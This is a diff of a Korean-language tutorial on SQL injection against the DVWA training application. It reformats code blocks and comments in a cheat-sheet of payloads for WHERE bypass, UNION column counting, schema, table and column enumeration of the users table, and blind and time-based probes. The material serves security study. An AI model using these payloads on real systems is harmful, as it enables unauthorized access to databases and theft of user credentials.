@@ -135,18 +135,21 @@ UNION을 이용한다면 DB의 모든 정보를 알아낼 수 있다. UNION을 �
 
 
 #### 데이터베이스 명 조회
-~~~sql 1' union select schema_name,1 from information_schema.schemata #~~~
 
+~~~sql 
+1' union select schema_name,1 from information_schema.schemata #
+~~~
 
 ![image](https://user-images.githubusercontent.com/53431568/126734180-ee4edb97-9856-46f9-9c3c-71c3d9ca07d5.png)
 
 
 #### dvwa 데이터베이스의 테이블 명 조회
+
 ~~~sql 
 1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #
 ~~~
  
- guestbook, users 라는 테이블이 있는 것을 확인할 수 있다. 개인정보가 있는것처럼 보이는 users 테이블을 살펴보도록 한다.
+위의 명령어를 통해 guestbook, users 라는 테이블이 있는 것을 확인할 수 있다. 개인정보가 있는것처럼 보이는 users 테이블을 살펴보도록 한다.
  
 ![image](https://user-images.githubusercontent.com/53431568/126734262-bc25ea5c-2802-4bd8-95bf-d94b0cbc18cb.png)
 
@@ -186,31 +189,31 @@ user_id, first name, surname, passwd 를 보여준다.
 <summary>명령어 정리🔎</summary>
 
 ~~~sql 
-// WHERE 구문 우회
+# WHERE 구문 우회
 1' or '1'='1
 
-// UNION을 이용한 칼럼 갯수 알아내기
+# UNION을 이용한 칼럼 갯수 알아내기
 1' union select 1,1#
 
-// ORDER BY 구문을 이용한 칼럼 갯수 알아내기
+# ORDER BY 구문을 이용한 칼럼 갯수 알아내기
 1' order by 2#
 
-// 데이터베이스 명 조회
+# 데이터베이스 명 조회
 1' union select schema_name,1 from information_schema.schemata #
 
-// dvwa 데이터베이스의 테이블 명 조회
+# dvwa 데이터베이스의 테이블 명 조회
 1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #
 
-// users 테이블 칼럼 조회
+# users 테이블 칼럼 조회
 1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'# 
 
-// 블라인드 SQL 인젝션 참 구문
+# 블라인드 SQL 인젝션 참 구문
 1' AND 1=1# 
 
-// 블라인드 SQL 인젝션 거짓 구문
+# 블라인드 SQL 인젝션 거짓 구문
 1' AND 1=2#
 
-// 시간기반 블라인드 SQL 인젝션 탐지 구문
+# 시간기반 블라인드 SQL 인젝션 탐지 구문
 1' AND SLEEP(5)#
 ~~~
 
